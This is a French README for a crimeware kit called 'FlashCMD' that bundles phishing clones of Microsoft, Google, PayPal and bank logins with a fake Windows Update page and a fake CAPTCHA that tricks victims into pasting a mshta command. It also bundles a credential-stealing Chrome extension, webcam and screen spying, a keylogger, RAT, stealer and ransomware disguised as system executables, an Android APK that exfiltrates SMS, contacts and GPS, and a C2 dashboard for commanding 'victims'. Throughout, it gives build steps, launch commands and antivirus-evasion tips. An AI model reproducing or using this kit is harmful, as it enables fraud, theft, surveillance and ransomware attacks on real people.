 FlashCMD — README COMPLET
> batman

---

## STRUCTURE DU DOSSIER

tool_max/
├── setup.py ← LANCER CELUI-LÀ EN PREMIER
├── server_v2.py ← serveur principal
├── clone.py ← cloner un site
├── generate.py ← afficher tous les liens
├── build.py ← compiler les .exe
│
├── payloads/
│ ├── dropper.py ← installe tout
│ ├── keylogger_win.py ← keylogger système
│ ├── rat.py ← contrôle à distance
│ ├── stealer.py ← vol credentials
│ ├── persistence.py ← persistence démarrage
│ └── ransomware.py ← chiffreur AES-256
│
├── extension/
│ ├── manifest.json
│ ├── background.js
│ ├── content.js
│ └── popup.html
│
├── c2/
│ └── dashboard.html
│
├── android/
│ ├── main.py
│ └── buildozer.spec
│
├── pages/ ← créé auto par clone.py
├── builds/ ← créé auto par build.py
└── frames/ ← créé auto par le serveur


---

## DÉMARRAGE EN 1 COMMANDE

```bash
python setup.py
```

Ça fait tout :
1. Installe les dépendances
2. Télécharge cloudflared
3. Lance le tunnel Cloudflare
4. Lance le serveur
5. Affiche l'URL publique
======================================================
URL PUBLIQUE : https://abc.trycloudflare.com
Fonctionne en 5G, WiFi, partout
Admin panel : https://abc.trycloudflare.com/admin
C2 dashboard : https://abc.trycloudflare.com/c2

---

## CE QUE CHAQUE VECTEUR FAIT

### 1. Phishing Microsoft `/`

La victime voit : page login Microsoft 2 étapes
Dès l’arrivée : IP, OS, navigateur, timezone collectés
keylogger JS actif
Si elle remplit : email + password dans creds.log


### 2. Fausse MAJ Windows `/update`

La victime voit : vraie page Windows Update avec barre
Si elle clique : télécharge setup.hta
mshta s’exécute (natif Windows)
télécharge + lance keylogger en fond
télécharge + lance dropper chain


### 3. CAPTCHA reCAPTCHA `/captcha`

La victime voit : vrai design Google reCAPTCHA
Elle coche : les 3 étapes apparaissent
Elle copie : commande dans le presse-papier
Elle colle Win+R: mshta s’exécute
keylogger installé en fond


### 4. Surveillance `/surveillance`

La victime voit : vérification Google 2 étapes
Elle autorise : snapshots caméra toutes les 2s
snapshots écran toutes les 3s
envoyés dans frames/ sur ton PC
Voir en direct : https://URL/c2 → onglet Live


### 5. URL piégée

Tu envoies : https://URL/go?url=https://youtube.com
ou le lien court https://URL/s/abc123
La victime : voit “chargement” 0.5 secondes
tu reçois IP réelle + IP locale (WebRTC)
+ OS, navigateur, batterie, timezone
puis elle arrive sur YouTube normalement
Générer : https://URL/admin
→ section “Piéger une URL”


### 6. HTA payload (vecteur principal)

URL : https://URL/hta/keylogger
Commande Win+R: mshta “https://URL/hta/keylogger”
Ce que ça fait:
→ s’exécute via mshta.exe (natif Windows)
→ aucune popup, aucune fenêtre visible
→ télécharge keylogger.py dans %TEMP%
→ lance en arrière-plan (pythonw)
→ installe persistence (registre + schtasks)
→ télécharge dropper (rat + stealer + persist)
→ machine dans ton C2 en 30 secondes


### 7. Extension Chrome

URL : https://URL/download/extension
Zip téléchargé, victime l’installe dans Chrome
Ce que ça capture :
→ toutes les URLs visitées
→ tous les formulaires sur tous les sites
→ champs password sur tous les sites
→ cookies de tous les sites
→ historique complet (500 entrées)
→ bookmarks
Logs : ext_form.log, ext_cookies.log, etc.


### 8. .exe Windows

Compiler : python build.py
Distribuer : https://URL/builds/WindowsSecuritySvc.exe
La victime double-clique :
→ fenêtre 0.1s puis disparaît
→ keylogger tourne en fond
→ captures toutes les frappes clavier
→ screenshots toutes les 60s
→ persistence registre + schtasks
→ machine dans ton C2


### 9. APK Android

Compiler : voir section APK ci-dessous
Distribuer : https://URL/builds/security_checker.apk
La victime installe et ouvre :
→ clique “Activer la protection”
→ autorise les permissions
→ SMS, contacts, GPS envoyés immédiatement
→ polling C2 toutes les 15s
Commandes C2 : sms / contacts / gps / info


---

## CONTRÔLER LES VICTIMES

### Dashboard web

https://URL/c2

Onglets :
Commande → envoyer une commande shell
Résultats → voir les sorties
Credentials→ logins volés
Keylogs → frappes clavier
Exfil → données exfiltrées
Live → caméra + écran en direct
Visits → log de toutes les visites

Boutons rapides :
sysinfo → infos système
whoami → utilisateur actuel
screenshot → capture d’écran immédiate
ip → interfaces réseau
proc → liste des processus


### CLI C2
```bash
python c2/c2_server.py https://URL

Commandes :
  bots              → liste des machines
  use <hostname>    → sélectionner
  push <cmd>        → envoyer une commande
  pushall <cmd>     → envoyer à tous
  results           → voir les résultats
  creds             → credentials phishés
  exfil             → données exfiltrées
  wait 15           → attendre et relire
```

---

## CLONER UN SITE

```bash
# Cloner Gmail
python clone.py https://accounts.google.com google

# Cloner PayPal
python clone.py https://www.paypal.com/signin paypal

# Cloner LinkedIn
python clone.py https://www.linkedin.com/login linkedin

# Cloner ta banque
python clone.py https://mabanque.fr/login banque

# Accéder au clone
https://URL/clone/google
```

---

## COMPILER LES .EXE

```bash
python build.py
# → entrer URL publique (ou Entrée pour garder)
# → .exe dans builds/

Fichiers créés :
  builds/WindowsSecuritySvc.exe  ← keylogger
  builds/setup_update.exe         ← dropper
  builds/svchost32.exe            ← RAT
  builds/chrome_helper.exe        ← stealer
```

---

## COMPILER L'APK ANDROID

```bash
# Sur Linux/WSL2 uniquement
sudo apt install python3-pip git zip unzip openjdk-11-jdk
pip3 install buildozer cython

cd android
# Remplacer l'URL dans main.py
sed -i 's|FILL_C2_URL|https://ton-url.trycloudflare.com|g' main.py

# Compiler (20-30 min la première fois)
buildozer android debug

# APK dans bin/
# Copier dans builds/
cp bin/*.apk ../builds/security_checker.apk
```

---

## TOUS LES LOGS

creds.log credentials phishés + fingerprints
keylog.log frappes clavier (JS + .exe)
visits.log toutes les requêtes HTTP reçues
tracking.log pixels emails ouverts
exfil.log données exfiltrées
ext_form.log formulaires extension Chrome
ext_cookies.log cookies extension Chrome
ext_nav.log navigation extension Chrome
frames/camera/ snapshots caméra par IP
frames/screen/ snapshots écran par IP


---

## DÉPANNAGE

### Serveur ne démarre pas
```bash
pip install requests beautifulsoup4 qrcode pillow cryptography pynput pyinstaller urllib3
```

### Tunnel Cloudflare ne fonctionne pas
```bash
# Vérifier cloudflared
./cloudflared --version

# Lancer manuellement
./cloudflared tunnel --url http://localhost:8080
```

### HTA bloqué par Windows

→ Certains AV bloquent .hta
→ Renommer en .tmp ou servir depuis /builds/
→ Désactiver Windows Defender sur machine test


### Pas de Python sur la machine cible

→ Le HTA ne fonctionnera pas
→ Utiliser le vecteur CAPTCHA + mshta uniquement
→ Ou distribuer le .exe compilé
→ L’extension Chrome fonctionne sans Python


### Clone pas beau visuellement
```bash
# Réessayer avec un autre User-Agent
# Modifier HEADERS dans clone.py
# Certains sites requièrent JavaScript pour s'afficher
```

### APK refusé par Android

→ Activer “Sources inconnues” dans Paramètres
→ Android 8+ : Paramètres → Apps → Accès spécial
→ Installer des apps inconnues → autoriser


---

## RÉSUMÉ COMMANDES

```bash
# 1. Tout lancer
python setup.py

# 2. Afficher tous les liens
python generate.py

# 3. Cloner un site
python clone.py https://accounts.google.com google

# 4. Compiler les .exe
python build.py

# 5. C2 CLI interactif
python c2/c2_server.py https://URL
```

---